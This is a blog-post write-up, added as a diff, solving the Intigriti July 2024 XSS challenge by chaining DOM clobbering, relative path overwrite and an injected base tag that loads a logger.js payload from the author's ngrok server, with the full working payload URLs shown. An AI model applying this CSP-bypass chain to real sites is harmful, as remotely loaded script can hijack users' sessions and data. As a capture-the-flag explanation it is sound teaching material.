@@ -1,0 +1,268 @@
+---
+title: Intigriti 0724 – July XSS Challenge
+date: '2024-07-06'
+draft: false
+authors: ['iyed']
+tags: ['Web', 'Intigriti 0724', 'XSS', 'JavaScript']
+summary: 'Chaining DOM Clobbering and Relative Path Overwrite to obtain XSS.'
+---
+
+![Challenge Banner](/static/images/intigriti-0724/intigriti_challenge_banner.png)
+
+## Introduction
+
+I started this July by solving the usual Intigriti challenge, it was a straightforward and fun challenge where as usual you need to connect the bugs and features you got and leverage them to an XSS in order to alert `document.domain`. In this blog post, I'll be explaining the different attack techniques encountered in this challenge, how I used them to pop an alert and my thinking methodology while solving the challenge.
+
+## Overview
+
+### Dynamic Analysis
+
+Let's start by taking a look at the [challenge's website](https://challenge-0724.intigriti.io/challenge/).
+
+![Challenge Website](/static/images/intigriti-0724/challenge_website.png)
+
+Nothing fancy, just a form with one input in which you put the content of your memo. Once you submit a memo, a GET request is made with the parameter **memo=MEMO+HERE** and the memo's content is reflected on the page.
+
+![Response after submitting a memo](/static/images/intigriti-0724/test_memo.png)
+
+If we try to inject an XSS payload like `<img src=x onerror=alert(1)>`, the tag gets rendered we can the icon indicating the image when it fails to load and for sure no alert. Taking a look at Chrome DevTools console we can see 2 errors.
+
+```
+< Uncaught
+< ReferenceError: isDevelopment is not defined
+<     at challenge/?memo=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E:52:9
+< Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'strict-dynamic' 'sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw=' 'sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo='". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present.
+```
+
+We can see the existence of a CSP blocking our payload and only allowing execution of scripts with the present hashes from the response and it is also allowing execution of scripts loaded by the scripts that are allowed to execute by using **strict-dynamic** keyword. In the example below the **strict-dynamic** keyword will allow the script with hash `sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=` to load additional scripts.
+
+```html
+<script integrity="sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=">
+    var s = document.createElement("script");
+    s.src = "https://example.com/some_exploit.js";
+    document.body.appendChild(s);
+</script>
+```
+
+There is also an interesting variable called **isDevelopment** that seems interesting.
+
+That should be it playing with the website for a bit. Now let's dive into some static analysis.
+
+### Static Analysis
+
+Let's take a look at the front page source code.
+
+```html
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Memo Sharing</title>
+    <script
+      integrity="sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw="
+      src="./dompurify.js"
+    ></script>
+    <link rel="stylesheet" href="./style.css" />
+  </head>
+  <body>
+    <div class="navbar">
+      <h1>Memo Sharing</h1>
+    </div>
+    <div class="container">
+      <div class="app-description">
+        <h4>
+          Welcome to Memo Sharing, your safe platform for sharing memos.<br />Just type your memo
+          below and send it!
+        </h4>
+      </div>
+      <form id="memoForm">
+        <input type="text" id="memoContentInput" placeholder="Enter your memo here..." required />
+        <button type="submit" id="submitMemoButton">Submit Memo</button>
+      </form>
+    </div>
+
+    <div class="memos-display">
+      <p id="displayMemo"></p>
+    </div>
+
+    <script integrity="sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=">
+      document.getElementById("memoForm").addEventListener("submit", (event) => {
+        event.preventDefault();
+        const memoContent = document.getElementById("memoContentInput").value;
+        window.location.href = `${window.location.href.split("?")[0]}?memo=${encodeURIComponent(
+          memoContent
+        )}`;
+      });
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const sharedMemo = urlParams.get("memo");
+
+      if (sharedMemo) {
+        const displayElement = document.getElementById("displayMemo");
+        //Don't worry about XSS, the CSP will protect us for now
+        displayElement.innerHTML = sharedMemo;
+
+        if (origin === "http://localhost") isDevelopment = true;
+        if (isDevelopment) {
+          //Testing XSS sanitization for next release
+          try {
+            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
+            displayElement.innerHTML = sanitizedMemo;
+          } catch (error) {
+            const loggerScript = document.createElement("script");
+            loggerScript.src = "./logger.js";
+            loggerScript.onload = () => logError(error);
+            document.head.appendChild(loggerScript);
+          }
+        }
+      }
+    </script>
+  </body>
+</html>
+```
+
+Reading the source code, we can see **dompurify** being included at the top and everything is done by the front end using JavaScript which redirects to the same page with **memo** parameter with our content after submitting a memo. Let's focus on the important part which treats our memo after submitting it. 
+
+```js
+  if (sharedMemo) {
+    const displayElement = document.getElementById("displayMemo");
+    //Don't worry about XSS, the CSP will protect us for now
+    displayElement.innerHTML = sharedMemo;
+
+    if (origin === "http://localhost") isDevelopment = true;
+    if (isDevelopment) {
+      //Testing XSS sanitization for next release
+      try {
+        const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
+        displayElement.innerHTML = sanitizedMemo;
+      } catch (error) {
+        const loggerScript = document.createElement("script");
+        loggerScript.src = "./logger.js";
+        loggerScript.onload = () => logError(error);
+        document.head.appendChild(loggerScript);
+      }
+    }
+  }
+```
+
+The first 2 lines take the input and inserts it into the DOM. Later, there is a check `origin === "http://localhost"` checking if the current origin is **localhost** or not. If so, it will define the **isDevelopment** variable we've seen in the dynamic analysis part and set it to **true**. All the code below that check will be executed only if **isDevelopment** variable is set to anything beside $0$ or **false**. 
+
+Since it's impossible to set **origin** to **localhost** in this case, we need to figure out how can we initialize the **isDevelopment** variable.
+
+Supposing that we had initialized that variable ourselves, we will enter the **try** and **catch** block. The **try** block isn't going to help at all. It's sanitizing our input with **DOMPurify** then inserting it into the DOM. Of course the challenge is not intended to solve by bypassing **DOMPurify** library because it's using the latest version and bypassing it would involve finding a 0day in the library :smiley_cat:. However, the **catch** block is interesting since it's creating a script tag and loading a script called **logger.js** relative to the current URL which as discussed in the dynamic analysis part will be allowed to execute even with the presence of CSP because of the **strict-dynamic** keyword.
+
+With that being said, and with the challenge's source simplicity, the challenge should be solved following this steps:
+
+1. Initialize the **isDevelopment** variable to some value.
+2. Somehow raise an error in the **try** block to enter the **catch** block.
+3. We can specify the base URL using the HTML tag `<base>` and make the domain/IP of our server a default URL for all relative URLs in the page, for example inserting `<base href="https://example.com/">`, making the **logger.js** script load from **https://example.com/logger.js**.
+4. Host **logger.js** with the payload `alert(document.domain)` on our server.
+
+## Solution
+
+Structuring all the pieces found in static and dynamic analysis and having the brainstorm discussed above to solve the challenge, all what's left is to start working on each step to achieve the popup alert.
+
+### Initializing global variables with DOM clobbering
+
+As I find PortSwigger the best resource for learning, explaining web attacks and making concepts simple for the reader to understand, here is a definition of this technique taken from their blog :
+
+>DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where [XSS](https://portswigger.net/web-security/cross-site-scripting) is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.
+>
+>The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as `submit`, to interfere with a form's actual `submit()` function.
+
+You can read more about **DOM Clobbering** in the PortSwigger blog here: [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering).
+
+This technique relies on a very old feature known as **named property access** on the **window** object. You can read about it in this documentation: [https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object).
+
+With that being said, if we inject an `<a>` tag with its **id** attribute set to **isDevelopment **like this `<a id="isDevelopment"></a>`, we can clobber that variable making it point to the tag we injected and so its value bypasses the check as said before because it's different from $0$ and **false**. Let's try injecting that payload and take a look at the devTools console. The current URL with our payload is [https://challenge-0724.intigriti.io/challenge/?memo=%3Ca%20id%3D%22isDevelopment%22%3E%3C%2Fa%3E](https://challenge-0724.intigriti.io/challenge/?memo=%3Ca%20id%3D%22isDevelopment%22%3E%3C%2Fa%3E).
+
+As expected the reference error saying **isDevelopment** variable is undefined is not shown anymore. Typing `isDevelopment` into the console will return a reference to the anchor tag we injected.
+
+```
+> isDevelopment
+< <a id="isDevelopment"></a>
+```
+
+So far so good. We are now inside the **try** block and its working well so no errors are thrown. We can also take a look at **DOMPurify** source code included by the challenge's page for `throw` statements, as this is the way to throw errors explicitly in JavaScript, maybe one malformed input will trigger an error. I'm not going to dig into this path as this will not help solve the challenge nor is the right way. However, doing so you'll find 5 `throw` statements and if you limit the code to only the part that is going to execute with the default configuration you practically have no way to throw an error. So how are we going to pass to the **catch** block.
+
+### Relative Path Overwrite (RPO)
+
+This technique is quite old and fun. The idea here is what if we can make **dompurify.js** load incorrectly making any reference to it undefined. This will for sure throw an error in the **try** block since it's using **DOMPurify**.
+
+Let us first take a look at some ways a page could load resources.
+
+- ```html
+  <script src="https://example.com/dompurify.js"></script>
+  ```
+
+- ```html
+  <script src="/dompurify.js"></script>
+  ```
+
+- ```html
+  <script src="./dompurify.js"></script>
+  ```
+
+- ```html
+  <script src="dompurify.js"></script>
+  ```
+
+The first one is going to load **dompurify.js** directly from the specified URL. The second way is going to load the file from the root of the current URL so if you are at **https://example.com/somepage/index.html**, it will load it from **https://example.com/dompurify.js**. The third and last ways are going to load the resource relatively to the current URL so if you are at **https://example.com/somepage/someEndpoint**, it will load it from **https://example.com/somepage/dompurify.js**.
+
+That looks fine. Say that we are browsing to the page [https://challenge-0724.intigriti.io/challenge/index.html](https://challenge-0724.intigriti.io/challenge/index.html), the content of the resource **index.html** is shown and all other resources loaded relatively are going to load relatively to the **challenge** folder **https://challenge-0724.intigriti.io/challenge/**. However, thanks to a feature that exists in many frameworks and HTTP servers, the same page can be accessed by browsing to [https://challenge-0724.intigriti.io/challenge/index.html/anythingItDoesntMatter](https://challenge-0724.intigriti.io/challenge/index.html/anythingItDoesntMatter).
+
+![Response upon browsing to https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere](/static/images/intigriti-0724/index.html.png)
+
+As you can observe, the page is loaded but with no styles from what we could see. Taking a look at **Network** tab from the Chrome DevTools, we can see that it loaded the resources perfectly with a **200 OK** response but it loaded all resources relatively to [https://challenge-0724.intigriti.io/challenge/index.html/](https://challenge-0724.intigriti.io/challenge/index.html/) since the page is loading the resources this way:
+
+```html
+<script
+      integrity="sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw="
+      src="./dompurify.js"
+></script>
+<link rel="stylesheet" href="./style.css" />
+```
+
+![Inspecting chrome network tab to see how resources were loaded](/static/images/intigriti-0724/network_tab_chrome_devtools.png)
+
+So the page loaded:
+
+- [https://challenge-0724.intigriti.io/challenge/index.html/dompurify.js](https://challenge-0724.intigriti.io/challenge/index.html/dompurify.js)
+- [https://challenge-0724.intigriti.io/challenge/index.html/style.css](https://challenge-0724.intigriti.io/challenge/index.html/style.css)
+
+Eventually, both of the resources loaded this way will return the content of **index.html** and not the content of the real files which are invalid JavaScript and invalid CSS. Let's now browse to [https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E](https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E) to see if the error is thrown and take a look at the console.
+
+```
+< Failed to find a valid digest in the 'integrity' attribute for resource 'https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/dompurify.js' with computed SHA-256 integrity 'T6qWAApYzyDAbQi4v3DmLdljNB8XAs06eI3hgUUfhRk='. The resource has been blocked.
+< Uncaught
+<   SyntaxError: Unexpected token '<' (at logger.js:1:1)
+< Uncaught
+<   ReferenceError: logError is not defined
+<     at loggerScript.onload (anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E:60:41)
+```
+
+Of course **dompurify.js** isn't going to load because the calculated SHA-256 hash of **index.html** isn't equal to the hash of the original file. The second error is thrown because **logger.js** was also loaded relatively to **https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/** returning the content of **index.html** which is invalid JavaScript. The last error is thrown because after loading **logger.js** (which loaded **index.html**) the function `logError` was not defined.
+
+What's left now is to change the base as discussed before to our server and host the **logger.js** file with our payload.
+
+### Changing the base URL
+
+To change the base URL what we have to do is simply inject the **base** tag with an **href** attribute holding as value our server domain/IP. Every resource that is loaded relatively will be loaded relative to the server's domain/IP you put. You can host the file wherever you want. I will be using ngrok and my local apache2 server for this one.
+
+Simply launching ngrok to forward http traffic when visiting the link it generated to **localhost:80** with this command `ngrok http 80`. It generated this link [https://a1ab-196-178-176-253.ngrok-free.app](https://a1ab-196-178-176-253.ngrok-free.app). I created **logger.js** file in **/var/www/html/** containing the payload `alert(document.domain)`.
+
+Having done the setup, let's change the base URL to **https://a1ab-196-178-176-253.ngrok-free.app** by adding `<base href="https://a1ab-196-178-176-253.ngrok-free.app">` to the payload. The payload becomes `<a id="isDevelopment"></a><base href="https://a1ab-196-178-176-253.ngrok-free.app">`. Browsing to this link now: [https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E%3Cbase%20href=%22https://a1ab-196-178-176-253.ngrok-free.app%22%3E](https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E%3Cbase%20href=%22https://a1ab-196-178-176-253.ngrok-free.app%22%3E). Finally, the alert is popped :smile:.​
+
+![Popup alert with document.domain](/static/images/intigriti-0724/alert.png)
+
+## Conclusion
+
+The challenge was simple and straightforward. I think some people were stuck on the Relative Path Overwrite part as the technique isn't well known but having dealt with it in the past made the idea pop in my head. Thanks Intigriti for the monthly challenges and shout out to the authors for the nice challenge. I hope you enjoyed reading the article and thanks for your time!
+
+You can contact me on:
+
+- Twitter: https://twitter.com/t0m7r00z
+- Discord: iyedmejri
+- LinkedIn: https://www.linkedin.com/in/iyed-mejri/
